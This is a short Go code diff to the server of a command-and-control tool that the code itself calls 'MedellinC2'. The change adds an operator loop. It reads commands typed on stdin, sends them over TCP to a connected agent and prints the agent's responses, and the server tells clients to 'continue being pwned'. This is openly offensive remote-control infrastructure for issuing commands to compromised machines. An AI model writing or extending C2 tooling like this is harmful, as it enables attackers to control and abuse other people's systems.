@@ -10,6 +10,7 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
 	"strings"
 	"time"
 
@@ -58,7 +59,20 @@ func handleClientRequest(con net.Conn) {
 		data.CheckDuplicateAgentUUID()
 	*/
 	if data.CheckDuplicateAgentUUID() == true {
-		getAgentInfo()
+		go getAgentInfo()
+		for {
+			reader := bufio.NewReader(os.Stdin)
+			fmt.Print(">> ")
+			text, _ := reader.ReadString('\n')
+			fmt.Fprintf(con, text+"\n")
+
+			message, _ := bufio.NewReader(con).ReadString('\n')
+			fmt.Print("->: " + message)
+			if strings.TrimSpace(string(text)) == "STOP" {
+				fmt.Println("TCP client exiting...")
+				return
+			}
+		}
 	}
 
 	for {
@@ -84,6 +98,7 @@ func handleClientRequest(con net.Conn) {
 
 		// Responding to the client request
 		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
+			//sendRemoteCommand(con)
 			log.Printf("failed to respond to client: %v\n", err)
 		}
 
